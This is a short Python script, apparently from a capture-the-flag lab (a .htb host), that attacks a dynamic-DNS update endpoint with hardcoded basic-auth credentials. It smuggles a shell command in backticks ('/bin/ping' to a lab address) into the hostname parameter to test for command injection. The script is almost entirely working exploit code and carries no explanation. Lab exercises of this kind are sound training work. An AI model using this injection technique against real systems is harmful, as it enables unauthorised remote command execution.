import requests

from requests.auth import HTTPBasicAuth
r = requests.get("""http://10.10.14.244/nic/update?hostname=`/bin/ping -c 1 10.10.14.103`"test.dynamicdns.htb&myip=10.10.14.103&offline=YES""", verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'))
print(r.text)
